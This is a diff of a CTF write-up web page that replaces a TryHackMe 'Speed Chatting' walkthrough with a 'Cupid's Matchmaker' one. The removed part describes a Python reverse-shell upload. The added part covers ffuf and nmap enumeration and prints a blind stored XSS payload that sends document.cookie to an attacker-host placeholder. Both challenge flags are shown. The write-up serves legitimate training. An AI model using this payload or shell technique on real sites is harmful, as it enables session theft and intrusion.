@@ -23,7 +23,7 @@
     
     
       
-        <title>Speed Chatting - Offense, Defense, and Everything Between</title>
+        <title>Cupid's Matchmaker - Offense, Defense, and Everything Between</title>
       
     
     
@@ -72,7 +72,7 @@
     <div data-md-component="skip">
       
         
-        <a href="#speed-chatting" class="md-skip">
+        <a href="#cupids-matchmaker" class="md-skip">
           Skip to content
         </a>
       
@@ -107,7 +107,7 @@
         <div class="md-header__topic" data-md-component="header-topic">
           <span class="md-ellipsis">
             
-              Speed Chatting
+              Cupid's Matchmaker
             
           </span>
         </div>
@@ -408,7 +408,35 @@
   <span class="md-ellipsis">
     
   
-    Coming Soon
+    Rooms
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Love at First Breach
   
 
     
@@ -521,10 +549,10 @@
 </li>
       
         <li class="md-nav__item">
-  <a href="#initial-enumeration" class="md-nav__link">
+  <a href="#enumeration" class="md-nav__link">
     <span class="md-ellipsis">
       
-        Initial Enumeration
+        Enumeration
       
     </span>
   </a>
@@ -580,45 +608,51 @@
       
       
       
-        <a href="../../../tags/#tag:unrestricted-file-upload" class="md-tag">unrestricted-file-upload</a>
+        <a href="../../../tags/#tag:web" class="md-tag">web</a>
       
     
       
       
       
       
-        <a href="../../../tags/#tag:web" class="md-tag">web</a>
+        <a href="../../../tags/#tag:xss" class="md-tag">xss</a>
       
     
   </nav>
 
 
 
-<h1 id="speed-chatting">Speed Chatting</h1>
+<h1 id="cupids-matchmaker">Cupid's Matchmaker</h1>
 <p><strong>Platform:</strong> TryHackMe<br />
 <strong>Type:</strong> Room<br />
 <strong>Difficulty:</strong> Easy<br />
-<strong>Link:</strong> <a href="https://tryhackme.com/room/lafb2026e4">Speed Chatting</a></p>
+<strong>Link:</strong> <a href="https://tryhackme.com/room/lafb2026e3">Cupid's Matchmaker</a></p>
 <h2 id="description">Description</h2>
-<p><em>Can you hack as fast as you can chat?</em>  </p>
-<p>"Days before Valentine's Day, TryHeartMe rushed out a new messaging platform called "Speed Chatter", promising instant connections and private conversations. But in the race to beat the holiday deadline, security took a back seat. Rumours are circulating that "Speed Chatter" was pushed to production without proper testing.</p>
-<p>As a security researcher, it's your task to break into "Speed Chatter", uncover flaws, and expose TryHeartMe's negligence before the damage becomes irreversible.</p>
-<p>You can find the web application here: http://MACHINE_IP:5000"</p>
-<h2 id="initial-enumeration">Initial Enumeration</h2>
-<p>Visitng the web page reveals a chatbot with a file upload functionality, apparently so that you can updte your profile picture. Looking at the source code suggests that the profile picture being displayed is atually being source from an external website:<br />
-<img alt="Home page source code" src="home_page_source_code.png" />  </p>
-<p>The source code also reveals that the destination web application is running Flask (a Python framework) and that the page is refreshed every 3 seconds to get the chat messages. Attempting to upload a reverse shell from <a href="https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/#python">PayloadsAllTheThings</a> shows that uploading a <code>.py</code> file is possible.<br />
-<img alt="Upload successful" src="upload_successful.png" />  </p>
-<p>I set up a local <code>nc</code> listener prior to uploading the shell (remember, the page automatically refreshes every 3 seconds - this includes the loading of the file allocated to the profile for the profile image), removed the <code>python -c</code> prefix from a reverse shell from PayloadsAllTheThings (because that prefix is specific to executing the reverse shell from a command line, not from within a self-contained .py file) and got a connection back to my attacking machine. From there, getting the flag was trivial:<br />
+<p><em>Use your web exploitation skills against this matchmaking service.</em></p>
+<p>"Tired of soulless AI algorithms? At Cupid's Matchmaker, real humans read your personality survey and personally match you with compatible singles. Our dedicated matchmaking team reviews every submission to ensure you find true love this Valentine's Day! 💘No algorithms. No AI. Just genuine human connection</p>
+<p>You can access the web app here: http://MACHINE_IP:5000"</p>
+<h2 id="enumeration">Enumeration</h2>
+<p>Given the challenge description, I went straight in for website enumeration. I used my go-to <code>ffuf</code> command to enumerate the website:<br />
+<code>ffuf -u http://TARGET_IP_ADDRESS/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -ic -c</code>. Nothing much interesting here - there's a login page uncovered but with no clue of a username, I shelved that for the time being:<br />
+<img alt="ffuf scan results" src="ffuf_scan_results.png" />  </p>
+<p>Inspection of the source code for the only three discovered pages didn't turn up anything useful and there was no <code>robots.txt</code> file. As a final initial enumeration step, I ran an <code>nmap</code> service scan against the port to check versioning but there didn't appear to be anything useful for exploitation here. It did reveal that I was working with a Flask server:<br />
+<img alt="nmap scan results" src="nmap_scan_results.png" />  </p>
+<p>Knowing that this was a Flask server, I considered it possible that there was SQLi involved. As a quick and dirty test, I put a <code>'</code> in both of the fields on the login page and got back a flat "Invalid credentials" warning, rather than a SQL error. With that in mind, I moved to the only other place that interaction with the site was possible - the "Survey" page.  </p>
+<p>A quick test submission of the form resulted in a message from the application to say that a member of staff would review the form submitted. With that in mind, and having seen that the form contents were not being stored anywhere accessible to me as an unauthenticated user, I decided to test for blind stored XSS vulnerability. There are mounds of resources available that explain XSS much better than I can so I won't do that here. I will however explain why that particular type of XSS makes sense here:  </p>
+<ul>
+<li>As mentioned, the application has advised that another user will be reviewing the contents of the form that is submitted. This is where the "stored" bit comes from - the attack needs to persist in the form for when the reviewer's browser renders it.  </li>
+<li>Once the form is submitted, I lose visibility of it entirely. This is the "blind" part of the attack, and means I need to have the payload execute a command that does something more than display a message on the reviewer's screen (e.g., like with an <code>&lt;alert&gt;</code> tag) and instead have it pass sensitive information from the reviewer's session to somewhere that I can see it.  </li>
+</ul>
+<p>With those two points in mind, I decided to use a payload from <a href="https://book.hacktricks.wiki/en/pentesting-web/xss-cross-site-scripting/index.html#retrieve-cookies">HackTricks</a> with the intention of having the reviewer's session cookie sent to an HTTP server I was hosting on my attacking machine:<br />
+<code>&lt;img src=x onerror=this.src="http://&lt;ATTACKING_IP&gt;/?c="+document.cookie&gt;</code>  </p>
+<p>After initiating a Python web server on my attacking machine, I entered the payload into each of the boxes on the "Survey" form (for speed - if I was being thorough, it would have been beneficial to figure out which field was vulnerable) and got a hit instantly back in my web server, which surprisingly contained the flag:<br />
 <img alt="Flag success" src="flag_success.png" />  </p>
 <details class="success">
 <summary>What is the flag?</summary>
-<div class="highlight"><pre><span></span><code>THM{R3v3rs3_Sh3ll_L0v3_C0nn3ct10ns}
+<div class="highlight"><pre><span></span><code>THM{XSS_CuP1d_Str1k3s_Ag41n}
 </code></pre></div>
 </details>
-<p><strong>Tools Used</strong><br />
-<code>nc</code></p>
-<p><strong>Date completed:</strong> 14/02/26<br />
+<p><strong>Date completed:</strong> 15/02/26<br />
 <strong>Date published:</strong> 17/02/26</p>
 
 
